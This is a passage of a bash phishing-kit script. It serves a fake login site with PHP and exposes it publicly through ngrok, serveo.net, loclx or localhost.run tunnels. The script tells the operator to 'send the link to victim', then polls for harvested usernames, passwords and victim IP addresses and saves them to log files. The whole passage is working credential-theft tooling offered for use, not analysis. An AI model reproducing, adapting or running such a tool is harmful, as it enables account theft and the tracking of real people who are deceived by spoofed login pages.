printf "\e[0m \e[0m     \e[0m \e[38;5;24;48;5;24m \e[38;5;18;48;5;18m   \e[38;5;37;48;5;37m          \e[48;5;18m▀\e[38;5;231m▄\e[38;5;18m \e[38;5;231;48;5;24m▄\e[38;5;37;48;5;18m▀\e[48;5;37m    ▄ ▀   \e[38;5;18;48;5;18m    \e[0m           \e[0m\n"
printf "\e[0m  \e[0m     \e[38;5;18;48;5;18m    \e[38;5;38;48;5;38m     \e[38;5;37;48;5;37m  \e[38;5;38;48;5;38m   \e[38;5;37;48;5;18m▄\e[0m   \e[38;5;37;48;5;18m▄\e[38;5;38;48;5;38m   \e[38;5;37m▀\e[48;5;37m \e[38;5;38;48;5;38m  \e[38;5;37m▀\e[38;5;38m  \e[38;5;18;48;5;18m    \e[0m \e[0m         \e[0m \e[0m\n"
printf "\e[0m   \e[0m   \e[0m \e[38;5;18;48;5;18m    \e[38;5;38;48;5;38m \e[38;5;37;48;5;37m    \e[38;5;38;48;5;38m \e[38;5;37;48;5;37m  \e[38;5;38;48;5;38m \e[38;5;37;48;5;37m  \e[38;5;31;48;5;17m▄\e[38;5;38;48;5;38m \e[38;5;31;48;5;17m▄\e[38;5;38;48;5;38m \e[38;5;37;48;5;37m \e[38;5;31;48;5;31m \e[38;5;37;48;5;37m  \e[38;5;38;48;5;38m \e[38;5;37;48;5;37m  \e[38;5;38;48;5;38m \e[38;5;37;48;5;37m \e[38;5;38;48;5;38m \e[38;5;18;48;5;18m▄\e[38;5;18m   \e[0m  \e[0m\n"
printf "\e[0m           \e[38;5;31;48;5;31m                         \e[0m\n"
printf "\e[0m           \e[38;5;25;48;5;25m                         \e[0m               \e[0m\n"
printf "\e[0m                                                   \e[0m\n"
printf "\e[0m\n"
printf " \e[1;31m+ --\e[0m\e[1;77m ==\e[0m\e[1;31m\e[0m\e[1;92m { SUCCESSFULLY HOSTED AT :\e[0m\e[0m\e[96m http://127.0.0.1:5555\e[0m\n"

datafound

}

start_ngrok() {

printf "\e[0m\n"
printf " \e[1;31m[\e[0m\e[1;77m/\e[0m\e[1;31m]\e[0m\e[1;92m Initializing...\e[0m\e[1;91m ( \e[0m\e[1;96mhttp://127.0.0.1:5555\e[0m\e[1;91m )\e[0m\n"
sleep 1
printf "\e[0m\n"
printf " \e[1;31m[\e[0m\e[1;77m/\e[0m\e[1;31m]\e[0m\e[1;92m Launching Ngrok ...\e[0m\n"
cd .htr/www && php -S 127.0.0.1:5555 > /dev/null 2>&1 & 
sleep 2
./.htr/ngrok http 127.0.0.1:5555 > /dev/null 2>&1 &
sleep 7
ngrok_link=$(curl -s -N http://127.0.0.1:4040/api/tunnels | grep -o "https://[0-9a-z]*\.ngrok.io")

smallbanner
printf "\e[0m\n"
printf " \e[1;31m[\e[0m\e[1;77m~\e[0m\e[1;31m]\e[0m\e[1;92m Send the link to victim :\e[0m\e[0m\e[96m %s \n" $ngrok_link

datafound
}

start_serveo() {

serveo_default_choose_sub="Y"
serveo_default_sub="$website$RANDOM"
serveo_def_port="5555"

printf "\e[0m\n"
printf ' \e[1;31m[\e[0m\e[1;77m~\e[0m\e[1;31m]\e[0m\e[1;92m Select a Port \e[0m\e[1;91m( \e[0m\e[1;92mDefault:\e[0m\e[1;96m %s \e[0m\e[1;91m )\e[0m\e[1;92m : \e[0m\e[0m\e[96m' $serveo_def_port
read serveo_port
serveo_port="${serveo_port:-${serveo_def_port}}"
sleep 1
printf "\e[0m\n"
printf ' \e[1;31m[\e[0m\e[1;77m~\e[0m\e[1;31m]\e[0m\e[1;92m Generate Custom Link ? \e[0m\e[1;91m[\e[0m\e[1;92mY\e[0m\e[1;91m/\e[0m\e[1;92mn\e[0m\e[1;91m] : \e[0m\e[0m\e[96m'
read serveo_choose_sub
serveo_choose_sub="${serveo_choose_sub:-${serveo_default_choose_sub}}"
if [[ $serveo_choose_sub == "Y" || $serveo_choose_sub == "y" || $serveo_choose_sub == "Yes" || $serveo_choose_sub == "yes" ]]; then
serveo_custom_subdomain=true
sleep 1
printf "\e[0m\n"
printf ' \e[1;31m[\e[0m\e[1;77m~\e[0m\e[1;31m]\e[0m\e[1;92m Input CUSTOM Subdomain : \e[0m\e[1;91m( \e[0m\e[1;92mDefault:\e[0m\e[0m\e[96m %s \e[0m\e[1;91m)\e[0m\e[1;92m: \e[0m\e[0m\e[96m' $serveo_default_sub
read serveo_subdomain
serveo_subdomain="${serveo_subdomain:-${serveo_default_sub}}"
sleep 1
fi

printf "\e[0m\n"
printf " \e[1;31m[\e[0m\e[1;77m~\e[0m\e[1;31m]\e[0m\e[1;92m Initializing...\e[0m\e[1;91m ( \e[0m\e[1;96mhttp://127.0.0.1:$serveo_port\e[0m\e[1;91m )\e[0m\n"
sleep 1
printf "\e[0m\n"
printf "\e[0m            \e[0m                           \e[0m            \e[0m\n"
printf "\e[0m         \e[0m           \e[38;5;30m▄▄▄\e[48;5;37m▀\e[48;5;233m▄▄▄\e[0m               \e[0m         \e[0m\n"
printf "\e[0m     \e[0m \e[0m \e[0m           \e[38;5;24m▄\e[38;5;31;48;5;31m         \e[38;5;30;48;5;233m▄\e[0m                \e[0m      \e[0m\n"
printf "\e[0m      \e[0m           \e[38;5;24m▄\e[38;5;31;48;5;31m           \e[38;5;24;48;5;233m▄\e[0m                \e[0m     \e[0m\n"
printf "\e[0m    \e[0m            \e[38;5;24m▄\e[38;5;31;48;5;31m             \e[38;5;24;48;5;233m▄\e[0m                \e[0m \e[0m \e[0m  \e[0m\n"
printf "\e[0m  \e[0m             \e[38;5;24m▄\e[38;5;72;48;5;31m▄\e[48;5;17m▀\e[48;5;233m▀\e[48;5;17m▀\e[48;5;233m▀\e[48;5;25m▀\e[38;5;23;48;5;31m▄\e[38;5;72m▄\e[38;5;23m▄\e[38;5;72;48;5;17m▀\e[48;5;233m▀\e[48;5;25m▀\e[48;5;18m▀\e[48;5;233m▀\e[48;5;31m▄\e[38;5;24;48;5;233m▄\e[0m                 \e[0m  \e[0m\n"
printf "\e[0m  \e[0m            \e[38;5;30m▄\e[38;5;36;48;5;17m▀\e[38;5;24m▄\e[38;5;17m \e[38;5;24;48;5;232m▀\e[48;5;233m▀\e[38;5;16;48;5;25m▄\e[0m \e[38;5;24m▀▀\e[38;5;17m \e[38;5;16;48;5;25m▄\e[38;5;17;48;5;233m▀\e[48;5;17m \e[38;5;24;48;5;233m▀\e[38;5;17;48;5;232m▀\e[38;5;24;48;5;17m▄\e[38;5;36m▀\e[38;5;37m▄\e[0m                \e[0m \e[0m \e[0m\n"
printf "\e[0m  \e[0m          \e[0m  \e[38;5;37;48;5;37m█\e[0m \e[38;5;23;48;5;233m▀\e[38;5;30;48;5;232m▄\e[38;5;231m▀\e[48;5;231m▄\e[48;5;255m▄\e[0m \e[0m   \e[38;5;234m▀\e[38;5;231;48;5;231m▄█\e[48;5;232m▀\e[38;5;72m▄\e[38;5;24;48;5;233m▀\e[0m \e[38;5;36;48;5;37m▀\e[0m  \e[0m              \e[0m  \e[0m\n"
printf "\e[0m           \e[0m   \e[38;5;25;48;5;25m \e[38;5;23;48;5;31m▀\e[0m \e[38;5;149;48;5;233m▀\e[48;5;150m▀\e[38;5;37;48;5;233m▄▄▄\e[48;5;37m   \e[48;5;233m▄▄▄\e[38;5;149;48;5;150m▀\e[48;5;233m▀\e[0m \e[38;5;23;48;5;31m▀\e[38;5;25;48;5;25m \e[0m    \e[0m              \e[0m\n"
printf "\e[0m \e[0m         \e[0m     \e[38;5;25;48;5;25m \e[38;5;31m▀\e[48;5;17m▄\e[0m \e[38;5;36;48;5;149m▀\e[48;5;36m███████\e[48;5;149m▀\e[0m \e[38;5;31;48;5;17m▄\e[48;5;25m▀\e[38;5;24;48;5;24m \e[0m      \e[0m             \e[0m\n"
printf "\e[0m         \e[0m       \e[38;5;25;48;5;25m  \e[38;5;31;48;5;31m \e[38;5;24;48;5;233m▄\e[38;5;71;48;5;17m▀\e[38;5;149;48;5;72m▄\e[38;5;72m▄▄▄\e[38;5;149m▄\e[38;5;71;48;5;233m▀\e[38;5;24m▄\e[38;5;31;48;5;31m \e[38;5;24;48;5;24m \e[38;5;25;48;5;25m \e[0m       \e[0m             \e[0m\n"
printf "\e[0m         \e[0m   \e[38;5;16;48;5;24m▀▀\e[38;5;24m    \e[38;5;25;48;5;25m  \e[38;5;18;48;5;18m \e[38;5;31m▀\e[38;5;38;48;5;38m \e[38;5;149m▀\e[38;5;31;48;5;31m \e[38;5;24;48;5;18m▀\e[38;5;18m \e[38;5;25;48;5;25m  \e[38;5;24;48;5;24m \e[38;5;25;48;5;25m \e[38;5;24;48;5;24m   \e[38;5;16m \e[0m\e[0m   \e[0m             \e[0m\n"
printf "\e[0m         \e[0m \e[38;5;16;48;5;24m▀\e[38;5;24m       \e[48;5;17m▀\e[38;5;17m    ▀ ▄▄▀\e[38;5;24m▀\e[48;5;24m   ▄  ▀\e[48;5;17m▄\e[0m             \e[0m\n"
printf "\e[0m        \e[38;5;30m▄\e[38;5;24;48;5;24m  \e[38;5;72;48;5;23m▄\e[38;5;149;48;5;72m▀▀▀▀▀▀▀▀▀▀▀▀▀▀\e[48;5;78m▀\e[48;5;72m▀▀▀▀▀▀▀▀\e[38;5;23m▀\e[38;5;24;48;5;24m  \e[38;5;30;48;5;233m▄\e[0m            \e[0m\n"
printf "\e[0m \e[0m       \e[38;5;24;48;5;24m▀  \e[38;5;36;48;5;36m████████████\e[48;5;79m▄\e[48;5;36m███\e[48;5;73m▄▀\e[48;5;36m███████\e[38;5;24;48;5;24m   \e[0m            \e[0m\n"
printf "\e[0m \e[0m      \e[38;5;31;48;5;24m▄\e[38;5;24m   \e[38;5;36;48;5;36m█████████\e[38;5;30;48;5;30m█\e[38;5;36;48;5;36m█████████\e[38;5;37;48;5;37m█\e[38;5;36;48;5;36m█\e[38;5;37;48;5;37m██\e[38;5;36;48;5;36m██\e[38;5;24;48;5;24m   \e[38;5;30;48;5;37m▀\e[0m           \e[0m\n"
printf "\e[0m \e[0m     \e[0m \e[38;5;24;48;5;24m \e[38;5;18;48;5;18m   \e[38;5;37;48;5;37m          \e[48;5;18m▀\e[38;5;231m▄\e[38;5;18m \e[38;5;231;48;5;24m▄\e[38;5;37;48;5;18m▀\e[48;5;37m    ▄ ▀   \e[38;5;18;48;5;18m    \e[0m           \e[0m\n"
printf "\e[0m  \e[0m     \e[38;5;18;48;5;18m    \e[38;5;38;48;5;38m     \e[38;5;37;48;5;37m  \e[38;5;38;48;5;38m   \e[38;5;37;48;5;18m▄\e[0m   \e[38;5;37;48;5;18m▄\e[38;5;38;48;5;38m   \e[38;5;37m▀\e[48;5;37m \e[38;5;38;48;5;38m  \e[38;5;37m▀\e[38;5;38m  \e[38;5;18;48;5;18m    \e[0m \e[0m         \e[0m \e[0m\n"
printf "\e[0m   \e[0m   \e[0m \e[38;5;18;48;5;18m    \e[38;5;38;48;5;38m \e[38;5;37;48;5;37m    \e[38;5;38;48;5;38m \e[38;5;37;48;5;37m  \e[38;5;38;48;5;38m \e[38;5;37;48;5;37m  \e[38;5;31;48;5;17m▄\e[38;5;38;48;5;38m \e[38;5;31;48;5;17m▄\e[38;5;38;48;5;38m \e[38;5;37;48;5;37m \e[38;5;31;48;5;31m \e[38;5;37;48;5;37m  \e[38;5;38;48;5;38m \e[38;5;37;48;5;37m  \e[38;5;38;48;5;38m \e[38;5;37;48;5;37m \e[38;5;38;48;5;38m \e[38;5;18;48;5;18m▄\e[38;5;18m   \e[0m  \e[0m\n"
printf "\e[0m           \e[38;5;31;48;5;31m                         \e[0m\n"
printf "\e[0m           \e[38;5;25;48;5;25m                         \e[0m               \e[0m\n"
printf "\e[0m                                                   \e[0m\n"
printf "\e[0m\n"
printf " \e[1;31m[\e[0m\e[1;77m~\e[0m\e[1;31m]\e[0m\e[1;92m Launching Serveo ...\e[0m\n"
cd .htr/www && php -S 127.0.0.1:$serveo_port > /dev/null 2>&1 & 
if [[ $serveo_custom_subdomain == true ]]; then
$(which sh) -c 'ssh -o StrictHostKeyChecking=no -o ServerAliveInterval=60 -o ServerAliveCountMax=60 -R %s:80:localhost:%s serveo.net > .nexlink 2> /dev/null &' $serveo_subdomain,$serveo_port
sleep 7

else
$(which sh) -c 'ssh -o StrictHostKeyChecking=no -o ServerAliveInterval=60 -R 80:localhost:%s serveo.net > .nexlink 2> /dev/null &' $serveo_port
sleep 7
fi
serveo_link=$(grep -o '.\{0,0\}http.\{0,100\}' .nexlink)
smallbanner
printf "\e[0m\n"
printf " \e[1;31m[\e[0m\e[1;77m~\e[0m\e[1;31m]\e[0m\e[1;92m Send this link to your victim :\e[0m\e[0m\e[96m %s \n" $serveo_link

datafound
}

start_loclx() {

loclx_default_choose_sub="Y"
loclx_default_sub="$website$RANDOM"

printf "\e[0m\n"
printf ' \e[1;31m[\e[0m\e[1;77m~\e[0m\e[1;31m]\e[0m\e[1;92m Generate Custom Link ? \e[0m\e[1;91m[\e[0m\e[1;92mY\e[0m\e[1;91m/\e[0m\e[1;92mn\e[0m\e[1;91m] : \e[0m\e[0m\e[96m'
read loclx_choose_sub
loclx_choose_sub="${loclx_choose_sub:-${loclx_default_choose_sub}}"
if [[ $loclx_choose_sub == "Y" || $loclx_choose_sub == "y" || $loclx_choose_sub == "Yes" || $loclx_choose_sub == "yes" ]]; then
loclx_custom_subdomain=true
sleep 1
printf "\e[0m\n"
printf ' \e[1;31m[\e[0m\e[1;77m~\e[0m\e[1;31m]\e[0m\e[1;92m Input CUSTOM Subdomain : \e[0m\e[1;91m( \e[0m\e[1;92mDefault:\e[0m\e[0m\e[96m %s \e[0m\e[1;91m )\e[0m\e[1;92m: \e[0m\e[0m\e[96m' $loclx_default_sub
read loclx_subdomain
loclx_subdomain="${loclx_subdomain:-${loclx_default_sub}}"
sleep 1
fi

printf "\e[0m\n"
printf " \e[1;31m[\e[0m\e[1;77m~\e[0m\e[1;31m]\e[0m\e[1;92m Initializing...\e[0m\e[1;91m ( \e[0m\e[1;96mhttp://127.0.0.1:4142\e[0m\e[1;91m )\e[0m\n"
sleep 1
printf "\e[0m\n"
printf " \e[1;31m[\e[0m\e[1;77m~\e[0m\e[1;31m]\e[0m\e[1;92m Launching LocalTunnel ...\e[0m\n"
cd .htr/www && php -S 127.0.0.1:4142 > /dev/null 2>&1 & 
if [[ $loclx_custom_subdomain == true ]]; then

./.htr/loclx tunnel http --to :4142 --subdomain $loclx_subdomain > .nexlink 2> /dev/null &

sleep 8

else
./.htr/loclx tunnel http --to :4142 > .nexlink 2> /dev/null &
sleep 8
fi
loclx_link=$(grep -o 'https://[0-9a-z]*\.loclx.io ' .nexlink)
smallbanner
printf "\e[0m\n"
printf " \e[1;31m[\e[0m\e[1;77m~\e[0m\e[1;31m]\e[0m\e[1;96m Send this link to your victim :\e[0m\e[0m\e[96m %s \n" $loclx_link

datafound
}

start_localhostrun() {

printf "\e[0m\n"
printf " \e[1;31m[\e[0m\e[1;77m~\e[0m\e[1;31m]\e[0m\e[1;92m Launching LocalHostRun ...\e[0m\n"
cd .htr/www && php -S 127.0.0.1:4545 > /dev/null 2>&1 & 
printf "\e[0m\n"
printf " \e[1;31m[\e[0m\e[1;77m~\e[0m\e[1;31m]\e[0m\e[1;92m Initializing...\e[0m\e[1;91m ( \e[0m\e[1;96mhttp://127.0.0.1:4545\e[0m\e[1;91m )\e[0m\n"
sleep 1
printf "\e[0m\n"
printf " \e[1;31m[\e[0m\e[1;77m~\e[0m\e[1;31m]\e[0m\e[0m\e[96m Press Ctrl+C to View Login Creds \e[0m\n"
sleep 1
printf "\e[0m\n"
printf " \e[1;31m[\e[0m\e[1;77m~\e[0m\e[1;31m]\e[0m\e[1;92m"
ssh -R 80:localhost:4545 ssh.localhost.run

printf "\e[0m\n"

printf "\n"
printf " \e[1;31m[\e[0m\e[1;77m::\e[0m\e[1;31m]\e[0m\e[0m\e[96m Login Credentials \e[1;31m[\e[0m\e[1;77m::\e[0m\e[1;31m]\e[0m\n"
printf "\e[0m\n"
while [ true ]; do


if [[ -e ".htr/www/ip.txt" ]]; then
printf " \e[1;31m[\e[0m\e[1;77m~\e[0m\e[1;31m]\e[0m\e[1;92m Ip of Victim Found !\e[0m\n"
grab_ip
rm -rf .htr/www/ip.txt
fi
sleep 0.75
if [[ -e ".htr/www/usernames.txt" ]]; then
account=$(grep -o 'Username:.*' .htr/www/usernames.txt | cut -d " " -f2)
IFS=$'\n'
password=$(grep -o 'Pass:.*' .htr/www/usernames.txt | cut -d ":" -f2)
printf " \e[1;31m[\e[0m\e[1;77m~\e[0m\e[1;31m]\e[0m\e[1;92m Account:\e[0m\e[1;96m %s\n\e[0m" $account
printf " \e[1;31m[\e[0m\e[1;77m~\e[0m\e[1;31m]\e[0m\e[1;92m Password:\e[0m\e[1;96m %s\n\e[0m" $password
cat .htr/www/usernames.txt >> logs/$website.log
printf "\e[0m\n"
printf " \e[1;31m[\e[0m\e[1;77m~\e[0m\e[1;31m]\e[0m\e[1;96m Saved:\e[0m\e[0m\e[96m logs/%s.log\e[0m\n" $website
printf "\n"
printf " \e[1;31m[\e[0m\e[1;77m~\e[0m\e[1;31m]\e[0m\e[1;96m Press Ctrl + C to Exit\e[0m\n"
rm -rf .htr/www/usernames.txt
fi
sleep 0.75

done

}

grab_ip() {

ip=$(grep -a 'IP:' .htr/www/ip.txt | cut -d " " -f2 | tr -d '\r')
IFS=$'\n'

printf "\e[0m\n"
printf " \e[1;31m[\e[0m\e[1;77m~\e[0m\e[1;31m]\e[0m\e[1;92m Victim IP:\e[0m\e[1;96m %s\e[0m\n" $ip
printf "\e[0m\n"
printf " \e[1;31m[\e[0m\e[1;77m~\e[0m\e[1;31m]\e[0m\e[1;96m Saved:\e[0m\e[0m\e[96m ip.txt\e[0m\n" $server
printf "\n"
cat .htr/www/ip.txt >> ip.txt

}

grab_creds() {

account=$(grep -o 'Username:.*' .htr/www/usernames.txt | cut -d " " -f2)
IFS=$'\n'
password=$(grep -o 'Pass:.*' .htr/www/usernames.txt | cut -d ":" -f2)
printf "\e[0m\n"
printf " \e[1;31m[\e[0m\e[1;77m~\e[0m\e[1;31m]\e[0m\e[1;92m Account:\e[0m\e[1;96m %s\n\e[0m" $account
printf "\e[0m\n"
printf " \e[1;31m[\e[0m\e[1;77m~\e[0m\e[1;31m]\e[0m\e[1;92m Password:\e[0m\e[1;96m %s\n\e[0m" $password
cat .htr/www/usernames.txt >> logs/$website.log
printf "\e[0m\n"
printf " \e[1;31m[\e[0m\e[1;77m~\e[0m\e[1;31m]\e[0m\e[1;96m Saved:\e[0m\e[0m\e[96m logs/%s.log\e[0m\n" $website
printf "\n"
printf " \e[1;31m[\e[0m\e[1;77m~\e[0m\e[1;31m]\e[0m\e[0m\e[96m Waiting for Next Credentials,\e[0m\e[1;96m Ctrl + C to exit.\e[0m\n"

}

datafound() {

printf "\n"
printf " \e[1;31m[\e[0m\e[1;77m*\e[0m\e[1;31m]\e[0m\e[0m\e[96m Waiting for Credentials,\e[0m\e[1;96m Ctrl + C to exit.\e[0m\n"
printf "\n"
while [ true ]; do


if [[ -e ".htr/www/ip.txt" ]]; then
printf "\e[0m\n"
printf " \e[1;31m[\e[0m\e[1;77m*\e[0m\e[1;31m]\e[0m\e[1;92m Ip of Victim Found !\e[0m\n"
grab_ip
rm -rf .htr/www/ip.txt
fi
sleep 0.75
if [[ -e ".htr/www/usernames.txt" ]]; then
printf "\e[0m\n"
printf " \e[1;31m[\e[0m\e[1;77m*\e[0m\e[1;31m]\e[0m\e[1;92m Login info Found !!\e[0m\n"
grab_creds
rm -rf .htr/www/usernames.txt
fi
sleep 0.75


done 

}

banner
reqs
menu
